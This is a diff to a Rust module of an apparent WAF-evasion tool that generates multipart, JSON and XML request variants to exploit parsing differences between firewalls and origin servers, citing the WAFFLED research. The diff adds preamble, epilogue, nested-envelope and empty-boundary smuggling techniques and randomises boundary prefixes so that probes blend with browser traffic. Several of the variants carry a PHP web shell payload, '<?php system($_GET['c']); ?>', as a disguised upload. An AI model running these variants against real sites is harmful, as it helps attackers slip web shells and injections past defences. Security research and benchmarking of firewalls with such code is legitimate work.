@@ -10,6 +10,7 @@
 //! Reference: "WAFFLED: Exploiting Parsing Discrepancies to Bypass WAFs"
 //!            Akhavani et al., IEEE S&P 2025
 
+use rand::Rng;
 use std::fmt::Write as _;
 
 /// Errors produced by content-type parsing and variant generation.
@@ -19,6 +20,10 @@ pub enum ContentTypeError {
     #[error("form body too large: {got} bytes exceeds cap of {cap} bytes")]
     BodyTooLarge { got: usize, cap: usize },
 }
+
+// SmuggleProbe trait impl lives at the bottom of this module (see
+// `impl wafrift_types::probe::SmuggleProbe for ContentTypeVariant`)
+// so the public surface here stays focused on the variant itself.
 
 /// A Content-Type variant with the transformed body.
 #[derive(Debug, Clone)]
@@ -31,10 +36,15 @@ pub struct ContentTypeVariant {
     pub technique: ContentTypeTechnique,
     /// Human-readable description.
     pub description: String,
+    /// Per-variant correlation token. Operators splice into a
+    /// custom header (`X-Probe-Id`, etc.) so server-side responses
+    /// can be attributed to the specific variant that triggered
+    /// them without leaking target identity.
+    pub canary: wafrift_types::canary::Canary,
 }
 
 /// Content-Type switching techniques.
-#[derive(Debug, Clone, PartialEq)]
+#[derive(Debug, Clone, PartialEq, Eq, Hash)]
 pub enum ContentTypeTechnique {
     /// Standard multipart/form-data (valid, but WAF may not inspect body deeply).
     Multipart,
@@ -79,31 +89,33 @@ pub enum ContentTypeTechnique {
     /// WAF reads the second; PHP `$_FILES` reads the first. Sicuranext
     /// 2025 confirmed against FortiWeb + PHP.
     MultipartDuplicatePartHeader,
-}
-
-impl ContentTypeTechnique {
-    /// Return a stable string key for this technique variant.
-    ///
-    /// Prefer this over  — the Debug representation
-    /// is controlled by the compiler and can change between Rust versions
-    /// or if the enum derives a custom Debug. This key is used as the
-    /// action name in the MCTS bridge so both the push site (legal_actions)
-    /// and the match site (apply) refer to the same literal.
-    #[must_use]
-    pub fn technique_key(&self) -> &'static str {
-        match self {
-            Self::Multipart => "Multipart",
-            Self::MultipartQuotedBoundary => "MultipartQuotedBoundary",
-            Self::MultipartWhitespaceBoundary => "MultipartWhitespaceBoundary",
-            Self::MultipartDuplicateBoundary => "MultipartDuplicateBoundary",
-            Self::MultipartCharsetPrefix => "MultipartCharsetPrefix",
-            Self::JsonUnicodeEscape => "JsonUnicodeEscape",
-            Self::JsonWithComments => "JsonWithComments",
-            Self::XmlNamespace => "XmlNamespace",
-            Self::XmlCdata => "XmlCdata",
-            Self::MixedContentType => "MixedContentType",
-        }
-    }
+    /// Bytes before the first `--<boundary>` delimiter line.
+    /// RFC 2046 §5.1.1 says preamble MUST be discarded; over-inspecting
+    /// flat-buffer WAFs scan it as body and trip on embedded
+    /// signatures while strict multipart parsers ignore it.
+    MultipartPreambleSmuggle,
+    /// Bytes after the closing `--<boundary>--` delimiter line.
+    /// RFC 2046 §5.1.1 says epilogue MUST be discarded; lenient
+    /// parsers that walk past the close may still surface it.
+    MultipartEpilogueSmuggle,
+    /// Closing delimiter followed by a fresh `--<boundary>` and more
+    /// parts. RFC says everything past the close is epilogue; re-entrant
+    /// parsers keep walking and emit the smuggled extra envelope.
+    MultipartPartialCloseReopen,
+    /// A multipart part whose body is itself a `multipart/mixed`
+    /// envelope with its own boundary. Non-recursive WAF inspectors
+    /// see one part; strict origin parsers (Spring, JAX-RS) recurse.
+    MultipartNestedEnvelope,
+    /// Bare `\n` line endings on every delimiter and header line
+    /// instead of `\r\n`. RFC 2046 requires CRLF; Unix-tolerant
+    /// origin parsers accept LF while WAF parsers built on RFC-strict
+    /// libraries reject the whole body.
+    MultipartLfOnlyDelimiters,
+    /// `Content-Type: multipart/form-data; boundary=` with an empty
+    /// boundary parameter. RFC 2046 requires 1..=70 chars; WAF parsers
+    /// that strictly enforce reject the body wholesale, while lenient
+    /// origins auto-detect the boundary from the first `--` line.
+    MultipartEmptyBoundaryParam,
 }
 
 /// Maximum size of a form-encoded body before parsing is refused.
@@ -240,49 +252,65 @@ pub fn parse_form_body_lossy(body: &[u8]) -> Vec<(String, String)> {
     parse_form_body(body).unwrap_or_default()
 }
 
-/// FNV-1a hash of params bytes for deterministic boundary generation.
-fn fnv1a_params_hash(params: &[(String, String)]) -> u64 {
-    let mut h: u64 = 0xcbf29ce484222325;
-    for (k, v) in params {
-        for b in k.bytes().chain(v.bytes()) {
-            h ^= u64::from(b);
-            h = h.wrapping_mul(0x100000001b3);
-        }
-    }
-    h
-}
+/// Realistic boundary prefixes drawn from major HTTP clients on the
+/// wire. Picking from this pool per-call defeats signature-based WAFs
+/// that pin `boundary=----WafriftBoundary` as a fingerprint and lets
+/// wafrift traffic blend with WebKit / undici / axios traffic that
+/// any real WAF must accept. The branded "Wafrift" entry is retained
+/// at the end of the pool so an operator who explicitly wants
+/// brand-visible probes (CI logging, blue-team correlation) still
+/// gets it sometimes.
+///
+/// Order matches the empirical traffic share on the open web circa
+/// 2024-2025: WebKit dominates browser uploads, undici dominates
+/// server-side Node fetch, axios dominates older Node + browser
+/// clients.
+pub(crate) const NEUTRAL_BOUNDARY_PREFIXES: &[&str] = &[
+    "----WebKitFormBoundary",
+    "----formdata-undici-",
+    "----formdata-",
+    "------ECMAScriptFormBoundary",
+    "------MultipartBoundary--",
+    "----WafriftBoundary",
+];
 
-/// Generate a boundary derived deterministically from FNV-1a of params + salt.
-fn fnv_boundary(params: &[(String, String)], salt: u64) -> String {
-    let mut h: u64 = fnv1a_params_hash(params);
-    h ^= salt;
-    h = h.wrapping_mul(0x100000001b3);
+/// Generate a random boundary string. The prefix is selected from
+/// [`NEUTRAL_BOUNDARY_PREFIXES`] per call so consecutive probes do
+/// not all share a single self-induced signature. The 128-bit hex
+/// tail provides per-call entropy and collision resistance against
+/// attacker-supplied values (see [`unique_boundary`]).
+fn random_boundary() -> String {
+    let prefix =
+        wafrift_types::pick::pick_from(NEUTRAL_BOUNDARY_PREFIXES, "----WafriftBoundary");
+    let mut rng = rand::thread_rng();
     let mut hex = String::with_capacity(32);
-    let h2 = h.wrapping_mul(0x517cc1b727220a95);
-    for b in h.to_le_bytes().iter().chain(h2.to_le_bytes().iter()) {
-        let _ = write!(&mut hex, "{b:02x}");
+    for _ in 0..16 {
+        let _ = write!(&mut hex, "{:02x}", rng.r#gen::<u8>());
     }
-    format!("----WafriftBoundary{hex}")
+    format!("{prefix}{hex}")
 }
 
-/// Generate a boundary that is guaranteed not to appear in any of the supplied
-/// values. Derived deterministically from FNV-1a of the values, mixed with
-/// an incrementing salt so multiple calls in the same request produce distinct boundaries.
+/// Generate a boundary guaranteed not to appear in any of the supplied
+/// values (collision-free framing). Falls back to plain `random_boundary`
+/// once a fresh value clears the inputs — the 128-bit hex tail makes
+/// this loop terminate on the first attempt with overwhelming probability,
+/// but checking explicitly costs nothing and prevents the once-in-the-
+/// universe case where a payload happens to embed our boundary.
 #[must_use]
 pub fn unique_boundary(values: &[&str]) -> String {
-    let pseudo_params: Vec<(String, String)> = values
-        .iter()
-        .enumerate()
-        .map(|(i, v)| (i.to_string(), (*v).to_string()))
-        .collect();
-    for salt in 0u64..16 {
-        let candidate = fnv_boundary(&pseudo_params, salt);
+    // Bounded retry: if the entropy source wedges, give up and ship the
+    // last candidate rather than spin forever. 16 attempts is already
+    // 16 * 128 = 2048 bits of separation from any plausible adversarial
+    // collision attempt.
+    let mut candidate = random_boundary();
+    for _ in 0..16 {
         let needle = format!("--{candidate}");
         if !values.iter().any(|v| v.contains(&needle)) {
             return candidate;
         }
+        candidate = random_boundary();
     }
-    fnv_boundary(&pseudo_params, u64::MAX)
+    candidate
 }
 
 fn cdata_escape(value: &str) -> String {
@@ -372,24 +400,43 @@ pub fn xml_safe_name(name: &str) -> String {
     result
 }
 
+/// Sanitise a multipart part-name for use in `Content-Disposition`.
+///
+/// - Strips raw CR/LF (would otherwise close the part-header section
+///   and let an attacker inject a fake part). Variant 11
+///   (CharsetEarlySection) and variant 13 (FilenameStarEncoded) used
+///   to interpolate `k` raw — a key containing CRLF would corrupt the
+///   probe and either crash the WAF or evade in a way that didn't
+///   pin a real bypass. R61 pass-21 §15 audit-hunts (CRLF injection).
+/// - Backslash-escapes `\` and `"` per RFC 7578 §4.2 so a key
+///   containing a quote can't terminate the `name="..."` value early.
+///
+/// `pub(crate)` so the variant emitters in `generate_variants` can
+/// reach it — collapses three independent escapings into one source
+/// of truth.
+pub(crate) fn safe_multipart_name(s: &str) -> String {
+    s.replace(['\r', '\n'], "")
+        .replace('\\', "\\\\")
+        .replace('"', "\\\"")
+}
+
+/// Sanitise a multipart part-value: strip raw CR/LF only (the body
+/// section is transparent to escapes; only the framing delimiters
+/// matter).
+pub(crate) fn safe_multipart_value(s: &str) -> String {
+    s.replace(['\r', '\n'], "")
+}
+
 /// Build a standard multipart body from params using the given boundary.
 /// Keys and values are sanitised to prevent framing breakage:
 /// - Quotes in `name=` are backslash-escaped per RFC 7578 §4.2.
 /// - CR/LF in keys or values are stripped (they would otherwise close
 ///   the part header section and let an attacker inject a fake part).
-fn build_multipart_body(params: &[(String, String)], boundary: &str) -> Vec<u8> {
-    fn safe_name(s: &str) -> String {
-        s.replace(['\r', '\n'], "")
-            .replace('\\', "\\\\")
-            .replace('"', "\\\"")
-    }
-    fn safe_value(s: &str) -> String {
-        s.replace(['\r', '\n'], "")
-    }
+pub(crate) fn build_multipart_body(params: &[(String, String)], boundary: &str) -> Vec<u8> {
     let mut body = String::new();
     for (key, value) in params {
-        let k = safe_name(key);
-        let v = safe_value(value);
+        let k = safe_multipart_name(key);
+        let v = safe_multipart_value(value);
         let _ = write!(
             &mut body,
             "--{boundary}\r\nContent-Disposition: form-data; name=\"{k}\"\r\n\r\n{v}\r\n"
@@ -434,6 +481,7 @@ pub fn generate_variants(params: &[(String, String)]) -> Vec<ContentTypeVariant>
             technique: ContentTypeTechnique::Multipart,
             description: "Standard multipart — WAF may not inspect body as deeply as form-encoded"
                 .into(),
+            canary: wafrift_types::canary::Canary::generate(),
         });
     }
 
@@ -447,6 +495,7 @@ pub fn generate_variants(params: &[(String, String)]) -> Vec<ContentTypeVariant>
             technique: ContentTypeTechnique::MultipartQuotedBoundary,
             description:
                 "Quoted boundary — valid per RFC 2046 but breaks many WAF multipart parsers".into(),
+            canary: wafrift_types::canary::Canary::generate(),
         });
     }
 
@@ -459,6 +508,7 @@ pub fn generate_variants(params: &[(String, String)]) -> Vec<ContentTypeVariant>
             body,
             technique: ContentTypeTechnique::MultipartWhitespaceBoundary,
             description: "Whitespace around boundary — servers trim it, WAFs may not".into(),
+            canary: wafrift_types::canary::Canary::generate(),
         });
     }
 
@@ -471,6 +521,7 @@ pub fn generate_variants(params: &[(String, String)]) -> Vec<ContentTypeVariant>
             body,
             technique: ContentTypeTechnique::MultipartCharsetPrefix,
             description: "Charset before boundary — some WAFs take first param as boundary".into(),
+            canary: wafrift_types::canary::Canary::generate(),
         });
     }
 
@@ -496,6 +547,7 @@ pub fn generate_variants(params: &[(String, String)]) -> Vec<ContentTypeVariant>
             technique: ContentTypeTechnique::MultipartDuplicateBoundary,
             description: "Duplicate boundary — WAF uses first (fake), server uses last (real)"
                 .into(),
+            canary: wafrift_types::canary::Canary::generate(),
         });
     }
 
@@ -541,6 +593,7 @@ pub fn generate_variants(params: &[(String, String)]) -> Vec<ContentTypeVariant>
             body: json_string.into_bytes(),
             technique: ContentTypeTechnique::JsonUnicodeEscape,
             description: "JSON with unicode escapes — WAF keyword rules miss escaped chars".into(),
+            canary: wafrift_types::canary::Canary::generate(),
         });
     }
 
@@ -569,6 +622,7 @@ pub fn generate_variants(params: &[(String, String)]) -> Vec<ContentTypeVariant>
                 description:
                     "JSON with comments — WAF JSON parser fails, server parser tolerates comments"
                         .into(),
+                canary: wafrift_types::canary::Canary::generate(),
             });
         }
     }
@@ -595,6 +649,7 @@ pub fn generate_variants(params: &[(String, String)]) -> Vec<ContentTypeVariant>
             description:
                 "XML with CDATA — payload inside CDATA section invisible to many WAF XML parsers"
                     .into(),
+            canary: wafrift_types::canary::Canary::generate(),
         });
     }
 
@@ -615,6 +670,7 @@ pub fn generate_variants(params: &[(String, String)]) -> Vec<ContentTypeVariant>
             body: xml.into_bytes(),
             technique: ContentTypeTechnique::XmlNamespace,
             description: "XML with namespace — WAFs often skip namespaced elements".into(),
+            canary: wafrift_types::canary::Canary::generate(),
         });
     }
 
@@ -631,6 +687,7 @@ pub fn generate_variants(params: &[(String, String)]) -> Vec<ContentTypeVariant>
             description:
                 "Mixed Content-Type — confuses WAF parser selection with contradictory signals"
                     .into(),
+            canary: wafrift_types::canary::Canary::generate(),
         });
     }
 
@@ -648,13 +705,18 @@ pub fn generate_variants(params: &[(String, String)]) -> Vec<ContentTypeVariant>
         let boundary = unique_boundary(&value_refs);
         let mut body: Vec<u8> = Vec::new();
         // Part 0 with utf-7 charset carrying the payload params.
+        // R61 pass-21: route `k` and `v` through the shared sanitisers
+        // so a corpus-supplied key containing `\r\n` cannot inject a
+        // fake part header (CRLF injection in Content-Disposition).
         for (k, v) in params {
+            let safe_k = safe_multipart_name(k);
+            let safe_v = safe_multipart_value(v);
             body.extend_from_slice(format!("--{boundary}\r\n").as_bytes());
             body.extend_from_slice(
-                format!("Content-Disposition: form-data; name=\"{k}\"\r\n").as_bytes(),
+                format!("Content-Disposition: form-data; name=\"{safe_k}\"\r\n").as_bytes(),
             );
             body.extend_from_slice(b"Content-Type: text/plain; charset=utf-7\r\n\r\n");
-            body.extend_from_slice(v.as_bytes());
+            body.extend_from_slice(safe_v.as_bytes());
             body.extend_from_slice(b"\r\n");
         }
         // Trailing dummy part with utf-8 charset (the one CRS sees).
@@ -669,6 +731,7 @@ pub fn generate_variants(params: &[(String, String)]) -> Vec<ContentTypeVariant>
             technique: ContentTypeTechnique::MultipartCharsetEarlySection,
             description:
                 "CVE-2026-21876 — early part charset (utf-7) carrying payload, benign utf-8 trailing dummy".into(),
+            canary: wafrift_types::canary::Canary::generate(),
         });
     }
 
@@ -704,6 +767,7 @@ pub fn generate_variants(params: &[(String, String)]) -> Vec<ContentTypeVariant>
             technique: ContentTypeTechnique::JsonDuplicateKey,
             description:
                 "Duplicate JSON key — WAF takes first (safe), backend takes last (injection)".into(),
+            canary: wafrift_types::canary::Canary::generate(),
         });
     }
 
@@ -725,12 +789,17 @@ pub fn generate_variants(params: &[(String, String)]) -> Vec<ContentTypeVariant>
         body.extend_from_slice(b"<?php system($_GET['c']); ?>\r\n");
         // Then: the standard form params so the multipart structure
         // contains the input fields the bench harness checks for.
+        // R61 pass-21: route `k`/`v` through the shared sanitisers so
+        // a corpus-supplied key containing `\r\n` cannot inject a fake
+        // part header (CRLF injection in Content-Disposition).
         for (k, v) in params {
+            let safe_k = safe_multipart_name(k);
+            let safe_v = safe_multipart_value(v);
             body.extend_from_slice(format!("--{boundary}\r\n").as_bytes());
             body.extend_from_slice(
-                format!("Content-Disposition: form-data; name=\"{k}\"\r\n\r\n").as_bytes(),
+                format!("Content-Disposition: form-data; name=\"{safe_k}\"\r\n\r\n").as_bytes(),
             );
-            body.extend_from_slice(v.as_bytes());
+            body.extend_from_slice(safe_v.as_bytes());
             body.extend_from_slice(b"\r\n");
         }
         body.extend_from_slice(format!("--{boundary}--\r\n").as_bytes());
@@ -740,6 +809,7 @@ pub fn generate_variants(params: &[(String, String)]) -> Vec<ContentTypeVariant>
             technique: ContentTypeTechnique::MultipartFilenameStarEncoded,
             description:
                 "RFC 5987 filename* with percent-encoded dot — WAF inspects filename= only".into(),
+            canary: wafrift_types::canary::Canary::generate(),
         });
     }
 
@@ -761,12 +831,15 @@ pub fn generate_variants(params: &[(String, String)]) -> Vec<ContentTypeVariant>
         );
         body.extend_from_slice(b"Content-Type: application/octet-stream\r\n\r\n");
         body.extend_from_slice(b"<?php system($_GET['c']); ?>\r\n");
+        // R61 pass-21 §15: route `k`/`v` through shared sanitisers.
         for (k, v) in params {
+            let safe_k = safe_multipart_name(k);
+            let safe_v = safe_multipart_value(v);
             body.extend_from_slice(format!("--{boundary}\r\n").as_bytes());
             body.extend_from_slice(
-                format!("Content-Disposition: form-data; name=\"{k}\"\r\n\r\n").as_bytes(),
+                format!("Content-Disposition: form-data; name=\"{safe_k}\"\r\n\r\n").as_bytes(),
             );
-            body.extend_from_slice(v.as_bytes());
+            body.extend_from_slice(safe_v.as_bytes());
             body.extend_from_slice(b"\r\n");
         }
         body.extend_from_slice(format!("--{boundary}--\r\n").as_bytes());
@@ -776,6 +849,7 @@ pub fn generate_variants(params: &[(String, String)]) -> Vec<ContentTypeVariant>
             technique: ContentTypeTechnique::MultipartDuplicatePartHeader,
             description:
                 "Duplicate Content-Disposition — first wins (PHP $_FILES), WAF reads second".into(),
+            canary: wafrift_types::canary::Canary::generate(),
         });
     }
 
@@ -796,6 +870,117 @@ pub fn generate_variants_from_body(body: &[u8]) -> Vec<ContentTypeVariant> {
         return Vec::new();
     }
     generate_variants(&params)
+}
+
+/// Generate the **complete** sweep of variants — the canonical
+/// WAFFLED set plus the
+/// [`multipart_smuggle`](crate::multipart_smuggle) preamble/epilogue
+/// /nested-envelope shapes. Prefer this over
+/// [`generate_variants_from_body`] when running a full WAF/origin
+/// divergence probe; the older function is preserved for callers that
+/// need a stable, smaller result set (LAW 2 backwards-compat).
+///
+/// **Ordering.** The two sets are **interleaved** (round-robin)
+/// rather than concatenated. A caller that takes only the first `N`
+/// variants (e.g. `bench-waf --variants 5`) is guaranteed to exercise
+/// at least one shape from each set even when N is well below the
+/// total. Concatenation would leave the smuggle shapes dark for any N
+/// smaller than the WAFFLED set's cardinality, defeating the wiring.
+#[must_use]
+pub fn generate_all_variants(params: &[(String, String)]) -> Vec<ContentTypeVariant> {
+    let primary = generate_variants(params);
+    let smuggle = crate::multipart_smuggle::generate_smuggle_variants(params);
+    let cap = primary.len() + smuggle.len();
+    let mut out = Vec::with_capacity(cap);
+    let mut pi = primary.into_iter();
+    let mut si = smuggle.into_iter();
+    loop {
+        let p = pi.next();
+        let s = si.next();
+        match (p, s) {
+            (None, None) => break,
+            (Some(p), None) => out.push(p),
+            (None, Some(s)) => out.push(s),
+            (Some(p), Some(s)) => {
+                out.push(p);
+                out.push(s);
+            }
+        }
+    }
+    out
+}
+
+/// Body-side companion of [`generate_all_variants`] — parses a raw
+/// form-encoded body, then runs the full variant sweep.
+#[must_use]
+pub fn generate_all_variants_from_body(body: &[u8]) -> Vec<ContentTypeVariant> {
+    let params = match parse_form_body(body) {
+        Ok(p) => p,
+        Err(_) => return Vec::new(),
+    };
+    if params.is_empty() {
+        return Vec::new();
+    }
+    generate_all_variants(&params)
+}
+
+impl wafrift_types::probe::SmuggleProbe for ContentTypeVariant {
+    fn canary(&self) -> &wafrift_types::canary::Canary {
+        &self.canary
+    }
+
+    fn technique(&self) -> String {
+        let suffix = match self.technique {
+            ContentTypeTechnique::Multipart => "multipart",
+            ContentTypeTechnique::MultipartQuotedBoundary => "multipart-quoted-boundary",
+            ContentTypeTechnique::MultipartWhitespaceBoundary => {
+                "multipart-whitespace-boundary"
+            }
+            ContentTypeTechnique::MultipartDuplicateBoundary => {
+                "multipart-duplicate-boundary"
+            }
+            ContentTypeTechnique::MultipartCharsetPrefix => "multipart-charset-prefix",
+            ContentTypeTechnique::JsonUnicodeEscape => "json-unicode-escape",
+            ContentTypeTechnique::JsonWithComments => "json-with-comments",
+            ContentTypeTechnique::XmlNamespace => "xml-namespace",
+            ContentTypeTechnique::XmlCdata => "xml-cdata",
+            ContentTypeTechnique::MixedContentType => "mixed-content-type",
+            ContentTypeTechnique::MultipartCharsetEarlySection => {
+                "multipart-charset-early-section"
+            }
+            ContentTypeTechnique::JsonDuplicateKey => "json-duplicate-key",
+            ContentTypeTechnique::MultipartFilenameStarEncoded => {
+                "multipart-filename-star-encoded"
+            }
+            ContentTypeTechnique::MultipartDuplicatePartHeader => {
+                "multipart-duplicate-part-header"
+            }
+            ContentTypeTechnique::MultipartPreambleSmuggle => "multipart-preamble-smuggle",
+            ContentTypeTechnique::MultipartEpilogueSmuggle => "multipart-epilogue-smuggle",
+            ContentTypeTechnique::MultipartPartialCloseReopen => {
+                "multipart-partial-close-reopen"
+            }
+            ContentTypeTechnique::MultipartNestedEnvelope => "multipart-nested-envelope",
+            ContentTypeTechnique::MultipartLfOnlyDelimiters => {
+                "multipart-lf-only-delimiters"
+            }
+            ContentTypeTechnique::MultipartEmptyBoundaryParam => {
+                "multipart-empty-boundary-param"
+            }
+        };
+        format!("content-type.{suffix}")
+    }
+
+    fn description(&self) -> &str {
+        &self.description
+    }
+
+    fn artifact(&self) -> wafrift_types::probe::SmuggleArtifact {
+        wafrift_types::probe::SmuggleArtifact::BodyWithContentType {
+            content_type: self.content_type.clone(),
+            body: self.body.clone(),
+        }
+    }
 }
 
 #[cfg(test)]
